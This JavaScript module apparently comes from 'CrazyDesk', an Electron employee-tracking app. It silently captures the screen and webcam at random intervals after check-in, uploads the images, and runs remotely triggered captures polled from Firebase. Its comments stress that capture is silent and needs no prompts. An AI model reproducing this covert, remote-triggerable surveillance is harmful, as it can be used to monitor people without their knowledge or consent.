/* ═══════════════════════════════════════════════════════════════
   Capture module — silent screen + camera capture
   ═══════════════════════════════════════════════════════════════
   SCREEN — uses electronAPI.captureScreen() → desktopCapturer
            COMPLETELY SILENT. No prompts.

   CAMERA — uses navigator.mediaDevices.getUserMedia().
            In Electron, camera permission is auto-granted.
            LED blinks for ~0.5s.

   REMOTE — polls capture_commands collection for web-triggered
            capture requests. Executes them and marks as done.
   ═══════════════════════════════════════════════════════════════ */

import { saveTrackerLog, getSession, checkCaptureCommands, completeCaptureCommand } from './firebase.mjs';

const CAPTURE_MIN_MIN = 10;
const CAPTURE_MAX_MIN = 30;
const REMOTE_POLL_MS = 15_000; // Check for remote commands every 15s

const randomDelay = () =>
  (CAPTURE_MIN_MIN + Math.random() * (CAPTURE_MAX_MIN - CAPTURE_MIN_MIN)) * 60_000;

// ─── Screen capture (via main process IPC) ────────────────────
async function captureScreen() {
  try {
    console.log('[Capture] Requesting screen capture from main process...');
    const result = await window.electronAPI.captureScreen();

    // Handle permission prompt
    if (result && typeof result === 'object' && result.permissionNeeded) {
      console.warn('[Capture] Screen recording permission needed — user has been prompted');
      window.electronAPI?.notify('CrazyDesk', 'Please grant Screen Recording permission in System Settings, then restart the app.');
      return null;
    }

    if (!result) {
      console.warn('[Capture] Screen capture returned null');
      return null;
    }
    console.log(`[Capture] Screen buffer received: ${result.length || result.byteLength || 'unknown'} bytes`);
    return new Blob([result], { type: 'image/jpeg' });
  } catch (e) {
    console.warn('Screen capture error:', e);
    return null;
  }
}

// ─── Camera capture ───────────────────────────────────────────
async function captureCamera() {
  let stream = null;
  try {
    // Race camera against a timeout — if window is hidden, camera may hang
    const timeoutPromise = new Promise((_, reject) =>
      setTimeout(() => reject(new Error('Camera timeout')), 8000)
    );
    stream = await Promise.race([
      navigator.mediaDevices.getUserMedia({ video: true }),
      timeoutPromise,
    ]);
    const video = document.createElement('video');
    video.srcObject = stream;
    video.setAttribute('playsinline', 'true');
    video.muted = true;
    await video.play();
    await new Promise(r => setTimeout(r, 500));
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
    video.pause();
    video.srcObject = null;
    video.remove();
    return blob;
  } catch (e) {
    console.warn('Camera capture error:', e);
    return null;
  } finally {
    stream?.getTracks().forEach(t => t.stop());
  }
}

// ─── Full capture (screen + camera → upload → save log) ───────
export async function performCapture(type = 'auto') {
  const { uid, displayName } = getSession();
  if (!uid) {
    console.warn('[Capture] No session UID, skipping capture');
    return { screenshotUrl: null, cameraImageUrl: null, flagged: true };
  }

  let screenshotUrl = null;
  let cameraImageUrl = null;

  console.log(`[Capture] Starting ${type} capture for user: ${uid}`);

  // Capture screen and camera in parallel for speed
  const [screenBlob, camBlob] = await Promise.all([
    captureScreen(),
    captureCamera(),
  ]);

  // Upload in parallel
  const uploads = [];

  if (screenBlob) {
    console.log(`[Capture] Screen blob size: ${screenBlob.size}`);
    uploads.push(
      screenBlob.arrayBuffer()
        .then(b => new Uint8Array(b))
        .then(buf => window.electronAPI.uploadImage(Array.from(buf), 'screen', uid))
        .then(url => { screenshotUrl = url; console.log(`[Capture] Screen upload: ${url ? 'success' : 'failed'}`); })
    );
  } else {
    console.warn('[Capture] Screen capture returned null blob');
  }

  if (camBlob) {
    console.log(`[Capture] Camera blob size: ${camBlob.size}`);
    uploads.push(
      camBlob.arrayBuffer()
        .then(b => new Uint8Array(b))
        .then(buf => window.electronAPI.uploadImage(Array.from(buf), 'camera', uid))
        .then(url => { cameraImageUrl = url; console.log(`[Capture] Camera upload: ${url ? 'success' : 'failed'}`); })
    );
  } else {
    console.warn('[Capture] Camera capture returned null blob');
  }

  await Promise.all(uploads);

  const flagged = !screenshotUrl && !cameraImageUrl;
  await saveTrackerLog({
    userId: uid,
    userDisplayName: displayName,
    screenshotUrl: screenshotUrl || '',
    cameraImageUrl: cameraImageUrl || '',
    type: flagged ? 'flagged' : type,
    flagged,
    source: 'desktop',
    ...(flagged ? { flagReason: 'Both camera and screen capture failed' } : {}),
  });

  return { screenshotUrl, cameraImageUrl, flagged };
}

// ─── Auto-capture scheduler ──────────────────────────────────
let autoTimer = null;

export function startAutoCapture(onCapture) {
  stopAutoCapture();

  const schedule = () => {
    const ms = randomDelay();
    console.log(`[Tracker] Next auto-capture in ~${Math.round(ms / 60000)} min`);
    autoTimer = setTimeout(async () => {
      const result = await performCapture('auto');
      onCapture?.(result);
      schedule();
    }, ms);
  };

  // First capture 3-5 min after check-in
  const firstDelay = (3 + Math.random() * 2) * 60_000;
  console.log(`[Tracker] First capture in ~${Math.round(firstDelay / 60000)} min`);
  autoTimer = setTimeout(async () => {
    const result = await performCapture('auto');
    onCapture?.(result);
    schedule();
  }, firstDelay);
}

export function stopAutoCapture() {
  if (autoTimer) {
    clearTimeout(autoTimer);
    autoTimer = null;
  }
}

// ─── Remote capture command poller ────────────────────────────
let remotePoller = null;

export function startRemotePoller(onCapture) {
  stopRemotePoller();

  // Do an immediate check on start
  (async () => {
    try {
      console.log('[Remote] Initial capture command check...');
      const commands = await checkCaptureCommands();
      console.log(`[Remote] Found ${commands.length} pending command(s)`);
      for (const cmd of commands) {
        console.log('[Remote] Executing capture command:', cmd._id);
        const result = await performCapture('remote');
        onCapture?.(result);
        await completeCaptureCommand(cmd._id);
      }
    } catch (e) {
      console.warn('[Remote] Initial poll error:', e);
    }
  })();

  remotePoller = setInterval(async () => {
    try {
      const commands = await checkCaptureCommands();
      if (commands.length > 0) {
        console.log(`[Remote] Found ${commands.length} pending command(s)`);
      }
      for (const cmd of commands) {
        console.log('[Remote] Executing capture command:', cmd._id);
        const result = await performCapture('remote');
        onCapture?.(result);
        await completeCaptureCommand(cmd._id);
      }
    } catch (e) {
      console.warn('[Remote] Poller error:', e);
    }
  }, REMOTE_POLL_MS);
}

export function stopRemotePoller() {
  if (remotePoller) {
    clearInterval(remotePoller);
    remotePoller = null;
  }
}

// ─── Start/stop all tracking ─────────────────────────────────
export function startAllTracking(onCapture) {
  startAutoCapture(onCapture);
  startRemotePoller(onCapture);
}

export function stopAllTracking() {
  stopAutoCapture();
  stopRemotePoller();
}

export { captureScreen, captureCamera };
